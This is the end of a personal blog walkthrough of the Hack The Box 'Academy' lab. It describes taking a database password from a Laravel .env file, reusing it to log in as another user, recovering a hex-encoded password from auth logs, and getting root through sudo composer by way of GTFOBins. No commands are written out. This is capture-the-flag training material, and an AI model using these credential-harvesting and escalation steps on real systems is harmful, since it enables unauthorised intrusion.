+<p>in the /var/www/html/academy folder got the laravel dir. .env has all the environment variables. got db password here . since the planner told us cry0l1t3 wrote the modules he probably used the same password for his account as the db pass<br>and boom am in<br><img src="/images/academy6.png" alt="user-2"><br>have to do privilege escalation<br>since the user doesnt have sudoers permission it says the command will be logged .<br><img src="/images/academy7.png" alt="command"></p>
+<p>its logged in /var/log/auth/<br>checked for any command with su in the file and extracted the data<br><img src="/images/academy8.png" alt="data"><br>converted the hex key to string and got password for mrb3n</p>
+<p><img src="/images/academy9.png" alt="user-3"></p>
+<p>from here used the <a target="_blank" rel="noopener" href="https://gtfobins.github.io/gtfobins/composer/">gtfobins composer</a> to do privilege escalation as this user had access to run composer as a sudo .<br>got the root flag</p>
+<p><img src="/images/academy10.png" alt="root"></p>
+
+	  <div class="article-footer-copyright">
+
+    本博客采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh" target="_blank">知识共享署名-非商业性使用-相同方式共享 4.0 国际许可协议(CC BY-NC-SA 4.0) 发布.</a>
+</div>
+
+	</div>
+
+	
+	<span id="/2020/12/12/Academy%20HTB/" class="leancloud-visitors view" data-flag-title="Academy HTB">
+		<em class="post-meta-item-text"> Page View </em> <i class="leancloud-visitors-count"></i>
+	</span>
+	
+	<div>
+  	<center>
+
+	<div class="pagination">
+
+    
+    
+    <a href="/2020/12/12/ID Exposed/" type="button" class="btn btn-default"><i
+                class="fa fa-arrow-circle-o-left"></i> Prev</a>
+    
+
+    <a href="/" type="button" class="btn btn-default"><i class="fa fa-home"></i>Home</a>
+    
+    <a type="button" class="btn btn-default disabled">Next<i class="fa fa-arrow-circle-o-right"></i></a>
+    
+
+    
+</div>
+
+
+    </center>
+	</div>
+	
+	<!-- comment -->
+	<!--
+<section id="comment">
+    <h2 class="title">Comments</h2>
+
+    
+</section>
+
+-->
+	
+	</div> <!-- col-md-9/col-md-12 -->
+
+
+	
+	<div id="side_meta">
+		<div class="col-md-3" id="post_meta"> 
+
+	<!-- date -->
+	
+	<div class="meta-widget">
+	<i class="fa fa-clock-o"></i>
+	2020-12-12 
+	</div>
+	
+
+	<!-- categories -->
+    
+
+	<!-- tags -->
+	
+	<div class="meta-widget">
+	<a data-toggle="collapse" data-target="#tags"><i class="fa fa-tags"></i></a>		  
+    <ul id="tags" class="tag_box list-unstyled collapse in">	  
+	    
+  <li><a href="/tags/HTB/">HTB<span>7</span></a></li> <li><a href="/tags/CTF/">CTF<span>7</span></a></li> <li><a href="/tags/CVE/">CVE<span>1</span></a></li>
+    </ul>
+	</div>
+		
+
+	<!-- toc -->
+	<div class="meta-widget">
+	
+	</div>
+	
+    <hr>
+	
+</div><!-- col-md-3 -->
+
+		
+
+	</div>
+	
+		
+
+</div><!-- row -->
+
+<!--
+ -->
+
+
+
+	</div>
+  </div>
+  <div class="container-narrow">
+  <footer> <p>
+  
+  &copy; 2020 dmeg's Blog
+  
+        
+</p>
+ </footer>
+</div> <!-- container-narrow -->
+  
+
+
+  
+<a id="gotop" href="#">   
+  <span>⬆︎TOP</span>
+</a>
+
+<script src="/js/jquery.imagesloaded.min.js"></script>
+<script src="/js/gallery.js"></script>
+<script src="/js/bootstrap.min.js"></script>
+<script src="/js/main.js"></script>
+<script src="/js/search.js"></script> 
+
+
+<link rel="stylesheet" href="/fancybox/jquery.fancybox.css" media="screen" type="text/css">
+<script src="/fancybox/jquery.fancybox.pack.js"></script>
+<script type="text/javascript">
+(function($){
+  $('.fancybox').fancybox();
+})(jQuery);
+</script>
+
+
+
+   <script type="text/javascript">      
+     var search_path = "search.xml";
+	 if (search_path.length == 0) {
+	 	search_path = "search.xml";
+	 }
+	 var path = "/" + search_path;
+     searchFunc(path, 'local-search-input', 'local-search-result');
+   </script>
+
+</body>
+   </html>
